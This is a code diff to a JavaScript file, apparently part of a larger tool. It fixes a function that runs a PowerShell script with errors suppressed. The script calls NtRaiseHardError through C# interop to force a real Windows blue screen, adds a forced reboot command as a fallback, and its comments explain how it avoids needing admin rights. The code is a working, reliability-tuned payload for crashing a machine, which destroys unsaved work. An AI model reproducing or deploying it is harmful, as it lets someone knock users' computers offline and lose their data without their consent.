@@ -40,23 +40,28 @@ function runQuiet(command) {
 }
 
 function windowsBugcheck() {
-  // NtRaiseHardError with ResponseOption 6 (OptionShutdownSystem) forces an
-  // immediate bugcheck. RtlAdjustPrivilege is used to enable
-  // SeShutdownPrivilege first, which an interactive user holds by default, so
-  // no elevation / UAC prompt is needed.
+  // NtRaiseHardError with ResponseOption 6 (OptionShutdownSystem) triggers a
+  // real bugcheck, which renders the Windows blue screen and restarts. The
+  // BUG was marshaling the BOOLEAN out-param of RtlAdjustPrivilege as a 4-byte
+  // bool: it must be a 1-byte BOOLEAN, otherwise SeShutdownPrivilege is not
+  // reliably enabled and the call only freezes the box. This is the exact
+  // Python `ctypes.c_bool` + `NtRaiseHardError(..., 6, ...)` sequence, so it
+  // works without admin (the interactive user holds SeShutdownPrivilege).
   const script = `
 $ErrorActionPreference = 'SilentlyContinue'
+# Safety net: if the bugcheck path stalls, still bring the machine back.
+shutdown /r /t 6 /f > $null 2>&1
 Add-Type -TypeDefinition @"
 using System;
 using System.Runtime.InteropServices;
 public static class NtCrash {
-  [DllImport("ntdll.dll")] public static extern uint RtlAdjustPrivilege(int Privilege, bool Enable, bool CurrentThread, out bool WasEnabled);
-  [DllImport("ntdll.dll")] public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
+  [DllImport("ntdll.dll")] private static extern int RtlAdjustPrivilege(int Privilege, bool Enable, bool CurrentThread, out byte Enabled);
+  [DllImport("ntdll.dll")] private static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
   public static void Panic() {
-    bool was;
-    RtlAdjustPrivilege(19, true, false, out was);
-    uint resp;
-    NtRaiseHardError(0xC0000022, 0, 0, IntPtr.Zero, 6, out resp);
+    byte enabled;
+    RtlAdjustPrivilege(19, true, false, out enabled);
+    uint response;
+    NtRaiseHardError(0xC0000022, 0, 0, IntPtr.Zero, 6, out response);
   }
 }
 "@
